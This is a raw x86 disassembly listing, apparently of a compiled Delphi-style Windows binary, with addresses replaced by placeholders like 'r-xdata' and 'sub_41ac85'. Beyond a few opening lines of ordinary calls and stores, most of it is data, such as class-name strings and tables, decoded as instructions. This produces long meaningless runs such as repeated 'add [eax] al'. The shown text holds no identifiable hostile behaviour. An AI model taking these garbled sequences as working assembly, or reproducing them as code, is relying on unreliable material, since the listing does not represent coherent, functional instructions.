mov dl 0x1
mov eax [ r-xdata ]
call sub_40cdb8
mov edx eax
test edx edx
je r-xdata
mov eax rw-data
call sub_40550c
mov dl 0x1
mov eax [ r-xdata ]
call sub_412e58
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_413f80
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_413f80
mov [ rw-data ] eax
sub edx 0xffffffd4
sub_41ac85
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ ebx - 0x1 ] ah
add [ eax ] al
xchg [ fs : esi ] al
inc [ fs : eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ ebp - 0x1 ] ah
add [ eax ] al
xchg [ fs : esi ] al
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ edi - 0x1 ] ah
add [ eax ] al
xchg [ fs : esi ] al
push 0x640000ff
xchg [ esi ] al
imul edi edi 0x86640000
inc esi
add [ edx - 0x1 ] ch
add [ eax ] al
xchg [ fs : esi ] al
imul edi edi 0x0
add [ esi + eax * 4 + 0x46 ] ah
add [ edi + edi * 8 ] ch
add [ esi + eax * 4 + 0x46 ] ah
add [ ebp - 0x1 ] ch
add [ eax ] al
xchg [ fs : esi ] al
outsb
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ edi - 0x1 ] ch
add [ eax ] al
xchg [ fs : esi ] al
push eax
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ ecx - 0x1 ] dl
add [ eax ] al
xchg [ fs : esi ] al
push edx
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ ebx - 0x1 ] dl
add [ eax ] al
xchg [ fs : esi ] al
push esp
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ ebp - 0x1 ] dl
add [ eax ] al
xchg [ fs : esi ] al
push esi
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ edi - 0x1 ] dl
add [ eax ] al
xchg [ fs : esi ] al
pop eax
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ ecx - 0x1 ] bl
add [ eax ] al
xchg [ fs : esi ] al
pop edx
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ ebx - 0x1 ] bl
add [ eax ] al
xchg [ fs : esi ] al
pop esp
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ ebp - 0x1 ] bl
add [ eax ] al
xchg [ fs : esi ] al
pop esi
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ edi - 0x1 ] bl
add [ eax ] al
xchg [ fs : esi ] al
inc eax
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ ecx - 0x1 ] al
add [ eax ] al
xchg [ fs : esi ] al
inc edx
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ ebx - 0x1 ] al
add [ eax ] al
xchg [ fs : esi ] al
inc esp
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ ebp - 0x1 ] al
add [ eax ] al
xchg [ fs : esi ] al
inc esi
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ edi - 0x1 ] al
add [ eax ] al
xchg [ fs : esi ] al
dec eax
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ ecx - 0x1 ] cl
add [ eax ] al
xchg [ fs : esi ] al
dec edx
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ ebx - 0x1 ] cl
add [ eax ] al
xchg [ fs : esi ] al
dec esp
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ ebp - 0x1 ] cl
add [ eax ] al
xchg [ fs : esi ] al
dec esi
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ edi - 0x1 ] cl
add [ eax ] al
xchg [ fs : esi ] al
xor bh bh
add [ eax ] al
xchg [ fs : esi ] al
xor edi edi
add [ eax ] al
xchg [ fs : esi ] al
xor bh bh
add [ eax ] al
xchg [ fs : esi ] al
xor edi edi
add [ eax ] al
xchg [ fs : esi ] al
xor al 0xff
add [ eax ] al
xchg [ fs : esi ] al
xor eax 0x640000ff
xchg [ esi ] al
inc [ ss : eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ edi ] dh
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ eax ] bh
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ ecx ] bh
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ edx ] bh
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ ebx ] bh
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ edi + edi * 8 ] bh
add [ eax ] al
xchg [ fs : esi ] al
cmp eax 0x640000ff
xchg [ esi ] al
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ edi ] bh
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ eax ] ah
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ ecx ] ah
inc [ eax ]
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_41aea5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41aeac
retn
sub_41aeb8
mov esp 0x10041ae
push es
push esp
inc ebx
outsd
insb
outsd
jb r-xdata
add [ eax ] al
add [ eax + 0x7fffffff ] al
lea eax [ eax ]
sbb al 0xaf
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + ebp * 4 ] bl
inc ecx
add [ eax + eax ] cl
add [ eax ] al
mov al 0x6d
inc eax
add [ ebx + esi + 0x40 ] cl
add [ eax + 0x33 ] bl
inc eax
add [ ebx + esi + 0x40 ] bl
add [ eax + 0x33 ] ah
inc eax
add [ ebx + esi + 0x40 ] dl
add [ eax + esi + 0x30b80040 ] bl
inc eax
add ah dh
xor [ eax ] al
cmovne ecx [ ecx + 0x6e ]
jbe r-xdata
popad
jo r-xdata
insb
imul esp [ edi + eax * 2 + 0x72 ] 0x69687061
arpl [ eax - 0x51 ] di
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x51 ] bh
inc ecx
add [ eax + eax ] cl
add [ eax ] al
mov al 0x6d
inc eax
add [ ebx + esi + 0x40 ] cl
add [ eax + 0x33 ] bl
inc eax
add [ ebx + esi + 0x40 ] bl
add [ eax + 0x33 ] ah
inc eax
add [ ebx + esi + 0x40 ] dl
add [ eax + esi + 0x30b80040 ] bl
inc eax
add ah dh
xor [ eax ] al
sbb [ ebp + 0x49 ] al
outsb
jbe r-xdata
push esp
imul esp [ ebx + 0x4f ] 0x61726570
inc esi
outsd
insb
imul esp [ edi + eax * 2 + 0x72 ] 0x69687061
arpl [ edi + 0x70 ] cx
jb r-xdata
jb r-xdata
push 0x65737261
je r-xdata
outsd
outsb
lea eax [ eax ]
cwde
scasd [ edi ]
inc ecx
add [ ebx ] al
or dl [ esi + eax * 2 + 0x6f ]
outsb
je r-xdata
jae r-xdata
inc esi
popad
insd
nop
in al dx
scasd [ edi ]
inc ecx
add [ ecx ] al
or al 0x54
je r-xdata
je r-xdata
imul ebp [ esi + 0x65 ] 0x5373660b
add [ eax ] al
add bh bh
add [ eax ] al
add [ eax + r-xdata ] dl
add ecx [ edx ]
push esp
inc esi
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
inc [ eax ]
add [ eax ] al
nop
or [ eax + 0xa030041 ] dh
outsd
outsb
je r-xdata
imul esi [ ebx + 0x68 ] 0x1
add [ edx ] al
add [ eax ] al
add [ edi + ebp * 4 + 0x66090041 ] dl
jo r-xdata
jae r-xdata
outsb
pop es
jo r-xdata
jo r-xdata
imul ebp [ ebx + 0x65 ] 0x874754f
inc edi
jb r-xdata
jae r-xdata
je r-xdata
je r-xdata
popa
jne r-xdata
outsd
add [ gs : eax ] eax
add [ eax ] al
add [ edi ] cl
add [ eax ] al
add ah dl
mov al 0x41
add [ edi ] al
outsd
insb
imul esp [ esi + eax + 0x70 ] 0x73614473
push 0x44737005
outsd
or al 0x70
inc ebx
insb
popad
jb r-xdata
jo r-xdata
inc esp
inc esp
outsd
je r-xdata
jo r-xdata
mov al 0x41
add [ ebx + 0x41b070c0 ] cl
add [ ebx ] al
or [ eax + edx * 2 + 0x65 ] edx
outsb
push ebx
je r-xdata
add al 0xb0
inc ecx
push ebx
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax + esi * 4 ] al
insb
or [ fs : esi + 0x73 ] ah
je r-xdata
je r-xdata
inc edx
insb
popad
arpl [ ebx + 0x7 ] bp
jo r-xdata
or al 0x70
jae r-xdata
jo r-xdata
push ebx
je r-xdata
push eax
or [ edi + 0x72 ] al
jo r-xdata
arpl [ ebx - 0x75 ] si
dec ebp
jb r-xdata
outsd
je r-xdata
imul eax [ edi ] 0x70
insd
outsd
imul esp [ ebx + 0x73 ] 0xb058c08b
inc ecx
add [ esi ] al
or edx [ esi + eax * 2 + 0x6f ]
outsb
je r-xdata
insb
add [ gs : eax ] eax
add [ eax ] al
add [ esi ] al
add [ eax ] al
add [ eax + esi * 4 + 0x41 ] ch
add [ edi ] al
jo r-xdata
outsd
push es
jo r-xdata
jb r-xdata
insb
imul esp [ ebx + 0xb ] 0x6e557366
pop es
jo r-xdata
pop es
jb r-xdata
insd
push edi
push 0x5657469
jo r-xdata
jo r-xdata
pop es
popad
jae r-xdata
jo r-xdata
inc esp
popad
jae r-xdata
add [ eax ] al
add [ eax ] al
xor [ edx + 0x41 ] 0x0
bound esi [ ebx + 0x53 ]
outsd
insb
imul esp [ edi + eax + 0x62 ] 0x656c4373
popad
insb
or al 0x70
insd
dec ebp
popad
jae r-xdata
jo r-xdata
imul esp [ ebx + 0x73 ] 0x41b0d890
add [ ebx ] al
or [ eax + edx * 2 + 0x65 ] dl
outsb
outsb
dec esi
outsd
je r-xdata
dec ecx
outsb
add [ eax ] al
add [ eax ] al
add [ edx + esi * 4 + 0x41 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x41b2 ] al
add [ eax ] al
jae r-xdata
rcl [ ecx + esi * 4 + 0xb030041 ] 0x54
inc edx
jb r-xdata
push 0x8b736369
push eax
outsb
dec esi
outsd
insd
outsd
jo r-xdata
dec esi
outsd
je r-xdata
dec esi
outsd
jae r-xdata
or eax 0x6e497370
je r-xdata
je r-xdata
jo r-xdata
add eax 0x6f4e6d70
jo r-xdata
inc esp
popad
jae r-xdata
imul edi [ eax + 0x65 ] 0x72470864
popad
jo r-xdata
inc ecx
add [ esi ] al
jae r-xdata
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
add al 0xb0
popad
jb r-xdata
or ah [ edx + 0x73 ]
push esi
jb r-xdata
bound esi [ ebx + 0x48 ]
push es
jo r-xdata
bound esi [ ebx + 0x46 ]
or [ eax + 0x6d ] esi
pop eax
dec esi
jo r-xdata
inc esp
outsd
or [ edi + 0x72 ] al
popad
jo r-xdata
jb r-xdata
bound esi [ ebx + 0x43 ]
insb
popad
dec esi
outsd
je r-xdata
add [ eax ] al
add [ eax + 0x70041b1 ] dl
dec ebp
jb r-xdata
insd
inc esi
jb r-xdata
jb r-xdata
or eax 0x654d6d70
jb r-xdata
jo r-xdata
or edx [ edx + eax * 2 + 0x72 ]
jne r-xdata
or eax 0x654d6d70
jb r-xdata
jae r-xdata
popad
jae r-xdata
push es
dec ebp
push eax
outsb
insb
imul eax [ 0x6f586d70 ] 0x72
or [ eax + 0x6d ] dh
dec esi
outsd
je r-xdata
add eax 0x6f4e6d70
je r-xdata
add eax 0x6f447370
je r-xdata
or esp [ gs : esi + 0x73 ]
push ebx
outsb
je r-xdata
imul esp [ ebx + 0x73 ] 0x41afdc90
add [ edx ] cl
or [ esi + eax * 2 + 0x6f ] edx
dec ecx
je r-xdata
jo r-xdata
popad
bound ebp [ ebp + 0x7 ]
inc eax
add [ ebx + esi + 0x40 ] dl
add [ eax + esi + 0x30b80040 ] bl
inc eax
add ah bh
inc edx
inc ecx
add [ esp + eax * 2 ] cl
inc ecx
add [ esp + eax * 2 ] dl
inc ecx
add [ eax ] ch
inc ebx
inc ecx
inc esp
imul esp [ ebx + 0x61 ] 0x73620b6c
add [ eax ] bl
add [ eax ] al
add [ eax + 0x1a ] ch
inc ecx
jpe r-xdata
inc esi
insb
or esp [ edx + 0x73 ]
dec ebp
popad
jae r-xdata
add [ ecx ] al
add ch bh
jae r-xdata
mov eax eax
xchg esp eax
mov cl 0x41
inc edi
jb r-xdata
jb r-xdata
inc ebx
outsd
jo r-xdata
add [ eax ] al
test al 0xb2
inc ecx
add [ eax ] ah
imul esp [ ebx + 0x73 ] 0xffff0001
nop
sub al 0xb3
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bh
mov bl 0x41
add [ ebx + esi * 4 + 0x41 ] bl
add [ eax ] eax
imul esp [ ebx + 0x73 ] 0x656a624f
arpl [ eax + eax * 4 - 0x4e ] si
inc ecx
add [ edi ] al
andps xmm0 [ edi + 0x72 ]
popad
jo r-xdata
add [ gs : eax ] eax
add [ eax ] al
outsb
pop es
jo r-xdata
add [ edi ] al
dec esi
outsd
je r-xdata
je r-xdata
popad
jo r-xdata
insd
or [ gs : edi + 0x72 ] al
[ eax + 0xf0041c7 ]
push esp
inc edi
jb r-xdata
jo r-xdata
dec ebp
popad
jae r-xdata
inc ecx
push 0x6c797453
jae r-xdata
outsd
jb r-xdata
or esp [ edx + 0x73 ]
inc edx
inc esp
imul esp [ ecx + 0x67 ] 0x6c616e6f
insb
add eax 0x6f586d70
imul esp [ ecx + 0x67 ] 0x6c616e6f
outsd
jb r-xdata
or [ eax + 0x6d ] esi
inc ecx
add [ ebx + esi + 0x40 ] cl
add [ eax + 0x33 ] bl
inc eax
add [ ebx + esi + 0x40 ] bl
add [ eax + 0x33 ] ah
outsb
je r-xdata
mov [ ecx ] 0x7247540f
or esp [ edx + 0x73 ]
inc esp
imul esp [ ecx + 0x67 ] 0x736f7243
jae r-xdata
pop es
bound esi [ ebx + 0x43 ]
jb r-xdata
outsd
outsb
jo r-xdata
or [ edi + 0x72 ] al
popad
jo r-xdata
add [ ebx ] al
imul esp [ ebx + 0x73 ] 0xb194c08b
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx - 0x4d ] cl
inc ecx
add [ edx - 0x4d ] dl
inc ecx
add [ eax + eax ] ah
add [ eax ] al
or al 0xb2
inc ecx
pop esp
mov bl 0x41
imul esp [ ebx + 0x73 ] 0x656a624f
arpl [ eax + ebx * 2 - 0x4e ] si
inc ecx
add ah bl
sbb al [ ecx ]
add [ eax ] al
or [ edi + 0x72 ] al
popad
jo r-xdata
dec ebp
jb r-xdata
outsb
popad
imul esp [ ebx + 0x73 ] 0x41b25890
pop eax
mov dl 0x41
add [ edx + esi * 4 + 0x41 ] ch
insb
nop
inc edi
outsd
popad
insb
dec esi
outsd
je r-xdata
add [ ebx + esi + 0x40 ] cl
add [ eax + 0x33 ] bl
inc eax
add [ ebx + esi + 0x40 ] bl
add [ eax + 0x33 ] ah
inc eax
add [ ebx + esi + 0x40 ] dl
add [ eax + esi + 0x30b80040 ] bl
inc eax
add [ eax + 0xc0041ca ] ch
inc esp
inc ecx
add [ esp + eax * 2 ] dl
inc ecx
add ah ch
0x41
mov dl 0x41
imul esp [ ebx + 0x73 ] 0xc08b0000
lodsb [ esi ]
mov dl 0x41
add [ edi ] cl
cmovns eax [ ebx + 0x68 ]
popad
outsb
dec esi
outsd
je r-xdata
dec esi
outsd
or dh [ gs : eax + 0x6d ]
inc eax
add [ eax - 0x57ffbfd0 ] bh
0x41
imul sp [ ebp + 0x72 ] 0x1114
inc eax
add [ ecx ] al
and [ ebx ] esp
mov dh 0x1f
cmpsd [ esi ] [ edi ]
inc esp
rcl [ ecx ] 0x1
sahf
xchg ebx eax
add [ eax ] ah
scasd [ edi ]
cmp eax 0x4708da82
jb r-xdata
add [ eax ] al
add [ ecx ] al
add ch bh
call eax
0x41
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + 0x200041b2 ] ch
jo r-xdata
sub_41b352
add eax 0x6e6f4654
inc ebx
outsd
insb
outsd
jb r-xdata
mov bl 0x41
add [ edi ] al
add eax 0x6e6f4654
je r-xdata
popad
insd
xchg esp eax
scasd [ edi ]
inc ecx
add [ eax ] ah
iretd
adc [ eax ] al
or dh cl
inc ecx
add [ eax ] dl
into
inc ecx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x48060002 ] al
add [ eax ] al
pop es
inc ebx
mov bl 0x41
add [ edx + esi * 4 + 0x41 ] bh
add [ edi ] al
add [ eax ] cl
inc edi
jb r-xdata
je r-xdata
push esp
inc esi
outsd
outsb
scasb [ edi ]
inc ecx
add [ eax ] bl
add [ eax ] al
[ eax ]
imul esp [ gs : edi + 0x68 ] 0x41afd874
add [ eax ] bh
into
add al [ eax ]
push es
dec eax
jo r-xdata
inc ecx
add [ eax - 0x32 ] dl
inc ecx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4e040003 ] al
fsubr [ edi - 0x31c7ffbf ]
push 0x65737261
je r-xdata
imul esp [ ebx + 0x73 ] 0xafe80007
inc ecx
add [ eax - 0x31 ] dl
inc ecx
add [ eax - 0x31 ] bl
inc ecx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070000 ] al
sub_41b3a4
inc ecx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050001 ] al
outsd
insb
outsd
jb r-xdata
popad
insd
xchg esp eax
scasd [ edi ]
inc ecx
add [ eax ] ah
iretd
adc [ eax ] al
or dh cl
inc ecx
add [ eax ] dl
into
inc ecx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x48060002 ] al
imul esp [ gs : edi + 0x68 ] 0x41afd874
add [ eax ] bh
into
inc ecx
add [ eax - 0x32 ] dl
inc ecx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4e040003 ] al
sub_41b460
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
shl [ ecx + eax * 2 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov ah 0xb4
inc ecx
add [ eax + eax ] bl
add [ eax ] al
or al 0xb2
inc ecx
add [ ebx + esi + 0x40 ] cl
add [ eax + 0x33 ] bl
inc eax
add [ ebx + esi + 0x40 ] bl
add [ eax + 0x33 ] ah
inc eax
add [ ebx + esi + 0x40 ] dl
add [ eax + esi + 0x30b80040 ] bl
inc eax
add ah al
iretd
sub_41b5e6
rol [ ecx ] cl
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0xffffff ] al
add [ eax ] al
add eax 0x6f6c6f43
jb r-xdata
inc eax
add [ ebx + esi + 0x40 ] bl
add [ eax + 0x33 ] ah
inc eax
add [ ebx + esi + 0x40 ] dl
add [ eax + esi + 0x30b80040 ] bl
inc eax
add [ edx + edx * 8 + 0x440c0041 ] cl
inc ecx
add [ esp + eax * 2 ] dl
inc ecx
add [ edx + edx * 8 + 0x54060041 ] dh
inc edx
jb r-xdata
mov cl 0x41
add [ eax ] cl
aad 0x41
add [ eax ] dl
aad 0x41
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] eax
add eax 0x6c797453
lea eax [ eax ]
add [ eax ] al
add [ eax ] al
jae r-xdata
jns r-xdata
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x41b6 ] dl
nop
shl [ ebp + 0x6070041 ] 0x54
inc edx
jb r-xdata
jb r-xdata
outsd
pop eax
mov bl 0x41
add [ eax + eax ] cl
add bh bh
insb
mov dh 0x41
lea eax [ eax ]
mov dh 0x41
add [ edi ] al
pop es
add [ eax ] al
add [ eax ] al
add [ esi + esi * 4 + 0x580041 ] al
jae r-xdata
popad
jae r-xdata
push r-xdata
and [ eax ] al
add bh bh
and [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0xcc0020 ] al
add [ eax ] eax
or [ ebx + 0x6f ] al
jo r-xdata
mov ah 0x41
add [ eax ] dl
add [ eax ] al
[ edx + ebx * 8 + 0x41 ]
pop esp
fiadd [ ecx ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al [ eax ]
jae r-xdata
nop
mov dh 0x41
add [ eax ] al
test al 0xb5
inc ecx
add [ edx + esi * 4 + 0x41 ] bh
add [ edx ] al
add [ eax ] cl
inc edi
jb r-xdata
push eax
mov eax [ eax ]
mov eax [ eax + 0x58 ]
jb r-xdata
add [ gs : bp + di ] cl
push eax
jb r-xdata
push ebx
je r-xdata
or [ eax + 0x73 ] dh
inc ebp
dec ebp
add al 0x46
outsd
outsb
je r-xdata
add [ eax ] al
add [ edx ] 0x0
mov dh 0x41
add ah bl
sbb al [ ecx ]
add al 0x0
or [ edi + 0x72 ] al
popad
jo r-xdata
add [ eax ] al
add [ eax ] al
jo r-xdata
xchg [ esp ] eax
jae r-xdata
xchg [ esp ] eax
inc eax
pop eax
outsb
je r-xdata
push cs
add [ gs : bx + si ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax ] dh
mov bh 0x41
add [ edx ] cl
jo r-xdata
push esp
push edx
arpl [ gs : edx + eax + 0x3 ] si
dec ebp
imul esp [ ebx + 0x73 ] r-xdata
or [ esi ] cl
push esp
push eax
jb r-xdata
imul esp [ ebx + 0x73 ] 0xb5bc0004
inc ecx
add [ eax + eax ] dl
add bh bh
js r-xdata
add [ eax ] al
push 0x4c00411a
xor eax [ eax ]
pop eax
xor eax [ eax ]
pop esp
xor eax [ eax ]
pushad
xor eax [ eax ]
push esp
xor eax [ eax ]
pushfd
xor [ eax ] al
mov eax 0x8004030
salc
inc ecx
add [ esp + eax * 2 ] cl
inc ecx
add [ esp + eax * 2 ] dl
inc ecx
add [ eax ] ch
inc ebx
inc ecx
add [ eax - 0x7bffbe24 ] bl
fadd [ ecx ]
mov eax 0x70041db
push esp
inc ebx
popad
outsb
jbe r-xdata
test [ esi + 0x580041 ] dh
imul esp [ ebx + 0x73 ] 0xaeb80002
inc ecx
add ah ch
rol [ ecx ] cl
hlt
retn
push ebx
je r-xdata
add [ eax + edx - 0x336fffc0 ] dl
add eax 0xffffffdc
push eax
mov eax [ eax ]
mov eax [ eax + 0x54 ]
outsd
outsb
add al 0x42
jns r-xdata
or [ edx + 0x65 ] edx
jb r-xdata
push ebx
je r-xdata
cmp edi [ eax - 0x47f6ffbf ]
inc ecx
push es
inc eax
jb r-xdata
push esp
inc ebx
popad
outsb
jbe r-xdata
inc ecx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42050000 ] al
jb r-xdata
retn
add al 0x24
add [ gs : ecx ] cl
push edx
jb r-xdata
jmp [ eax + 0xc ]
ja r-xdata
jb r-xdata
jb r-xdata
aam 0x11
sbb edx 0x0
ror [ edi + 0x60 ] 0xb2
fld [ esi - 0x48 ]
inc ecx
add [ eax + eax ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax eax
enter 0x41b8 0x0
pop edx
mov eax 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
mov ecx 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub al 0xb9
inc ecx
add [ ecx + edi * 4 ] dh
inc ecx
add [ eax ] ch
add [ eax ] al
add [ eax + 0x1b ] bl
inc ecx
add [ ebx + esi + 0x40 ] cl
add ah cl
inc esp
inc ecx
add [ ebx + esi + 0x40 ] bl
add [ eax + 0x33 ] ah
inc eax
add [ ebx + esi + 0x40 ] dl
add [ eax + esi + 0x30b80040 ] bl
inc eax
add ah bh
inc edx
inc ecx
add [ esp + eax * 2 ] cl
inc ecx
add [ ecx + esi * 8 + 0x41 ] bl
add [ eax ] ch
inc ebx
inc ecx
add [ ebp + eax * 2 + 0x41 ] bl
add ah ch
add [ ebx + 0x7ab8cd12 ] ah
add [ eax ] dh
mov bh 0x41
add [ eax + edx + 0x40 ] dl
imul ebp [ esi + 0x67 ] 0x4010f400
jb r-xdata
jae r-xdata
popad
jae r-xdata
outsd
imul ebp [ esi + 0x67 ] 0x52737009
jne r-xdata
add [ esi ] dl
mov eax 0x10041
add [ eax ] al
mov [ 0x7ab8cd12 ] eax
add [ eax ] al
adc [ eax ] al
add [ eax ] al
add [ eax ] al
xchg esp eax
outsb
add ah dh
adc [ eax ] al
xor [ edi + 0x10540041 ] dh
inc eax
inc ebp
jbe r-xdata
push esp
push eax
jb r-xdata
cmp al 0x10
inc eax
add [ eax ] ah
add [ eax ] al
jmp [ eax ]
adc al [ ecx ]
push edx
add eax 0x63655254
je r-xdata
inc edx
outsd
outsd
insb
popad
outsb
ja r-xdata
outsb
imul ebp [ fs : esi + 0x67 ] 0x61724708
jo r-xdata
outsb
imul ebp [ esi + 0x67 ] 0x45737008
hlt
outsb
je r-xdata
outsd
jb r-xdata
jae r-xdata
push ebx
je r-xdata
add ecx [ ebp + 0x73 ]
push es
push es
or [ esi ] al
push ebx
outsb
jb r-xdata
push esp
push eax
jb r-xdata
add [ 0x67617453 ] al
push cs
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x5 ] si
push ebx
je r-xdata
adc [ eax ] al
nop
int3
sub_41b9d4
scasb [ edi ]
mov ecx 0x41
add [ eax ] al
sub al 0xba
inc ecx
add [ edx + edi * 4 + 0x41 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] bh
mov edx 0xba4c0041
inc ecx
add [ eax + eax ] ch
add [ eax ] al
pop eax
sbb eax [ ecx ]
dec esp
xor eax [ eax ]
int3
sub_41ba42
cld
inc [ eax ]
inc [ ecx ]
and al 0xff
inc ecx
add [ eax ] cl
push esp
push eax
imul esp [ ebx + 0x74 ] 0x8d657275
inc eax
add [ edx + edi * 4 + 0x41 ] bl
add [ edi ] al
or [ eax + edx * 2 + 0x69 ] dl
arpl [ ebp + esi * 2 + 0x72 ] si
sbb al 0xba
inc ecx
add ah bl
sbb eax [ ecx ]
add [ eax ] al
or [ edi + 0x72 ] al
popad
jo r-xdata
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + edi * 4 ] ch
imul esp [ ebx + 0x73 ] 0xc8900000
mov edx 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
int3
inc ecx
add [ eax + eax ] ah
add [ eax ] al
jl r-xdata
mov eax 0xf4004030
xor [ eax ] al
inc eax
sub [ eax ] eax
or al 0x54
push ebx
push 0x64657261
dec ecx
insd
popad
lea eax [ bx + si ]
sub [ ebx + 0x41 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub al 0xbb
inc ecx
add [ ebx + esi + 0x40 ] cl
add [ eax + 0x33 ] bl
inc eax
add [ ebx + esi + 0x40 ] bl
add [ eax + 0x33 ] ah
inc eax
add [ ebx + esi + 0x40 ] dl
add [ eax + esi + 0x30b80040 ] bl
inc eax
add [ eax - 0xbffbdff ] bh
add [ edx ] eax
push cs
push esp
dec ebp
je r-xdata
add [ ebp + eax * 2 + 0x41 ] bl
add ah ch
imul bp [ ebp + 0x49 ] 0x616d
nop
mov [ ebx + 0x41 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cld
mov ebx 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al dx
mov ebx 0x300041
add [ eax ] al
jl r-xdata
inc eax
add [ eax - 0x47ffbfd0 ] bh
add [ edx ] eax
hlt
inc ecx
add [ ebx + esi + 0x40 ] cl
add ah cl
inc esp
inc ecx
add [ ebx + esi + 0x40 ] bl
add [ eax + 0x33 ] ah
inc eax
add [ ebx + esi + 0x40 ] dl
add [ eax + esi + 0x30b80040 ] bl
inc eax
add [ eax + 0x2 ] al
inc edx
add [ esp + eax * 2 ] cl
inc ecx
